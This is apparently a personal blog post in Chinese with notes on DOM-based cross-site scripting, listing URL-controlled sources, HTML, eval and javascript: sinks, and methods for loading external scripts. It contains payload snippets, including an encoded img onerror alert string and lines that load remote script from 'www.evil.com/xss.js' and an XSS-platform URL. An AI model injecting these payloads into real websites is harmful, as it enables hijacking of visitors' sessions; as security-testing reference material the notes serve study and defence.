---
title: xss笔记
url: 379.html
id: 379
comments: false
date: 2019-01-06 23:00:14
tags: 安全/代码
---

### url可控参数:

location.href  
location.hash  
location.search  
document.URL  
document.referrer  
document.documentURI  
document.baseURI

### js直接html输出:

    var xss='<xsss>';
    #js
    document.write(xss)
    document.getElementById("demo").innerHTML=xss;
    document.getElementById("demo").outerHTML=xss;
    #jquery
    html(xss)
    append(xss) - 在被选元素的结尾插入内容
    prepend(xss) - 在被选元素的开头插入内容
    after(xss) - 在被选元素之后插入内容
    before(xss) - 在被选元素之前插入内容
    #------------------
    #其他
    var json_xss={xss:'\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0061\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u0029\u003e',name:'abc'}
    .html(json_xss['xss'])
    

### js eval类:

    var xss='alert(1)';
    eval(xss)
    setTimeout(xss,1000); 
    setInterval(xss, 3000);
    

### js 伪协议适用环境

    #js
    var xss='javascript:alert()';
    location.href=xss;
    location.replace(xss);
    window.open(xss);
    #创建标签对的两种方法
    var iframe = document.createElement('iframe'); 
    iframe.src=xss;  
    document.body.appendChild(iframe);
    
    var iframe = document.createElement('iframe');
    iframe.setAttribute('src',xss);
    document.body.appendChild(iframe);
    
    #jquery
    .attr({"href":xss,"title" : xss});
    

### 加载引用外部js方法

    #js
    var xss_js='http://www.evil.com/xss.js';
    document.write("<script src="+xss_js+"></script>");
    
    var script = document.createElement('script');
    script.setAttribute('src',xss_js);
    document.body.appendChild(script);
    
    new_element=document.createElement("script");
    new_element.setAttribute("type","text/javascript");
    new_element.setAttribute("src",xss_js);
    document.body.appendChild(new_element);
    #jquery
    $.getScript(xss_js,function() {
      console.log('success')
    });
    $.ajax({
          url: "http://xsst.sinaapp.com/m.js",
          dataType: "script",
          cache: true
    })
    

* * *

请多指教、欢迎交流。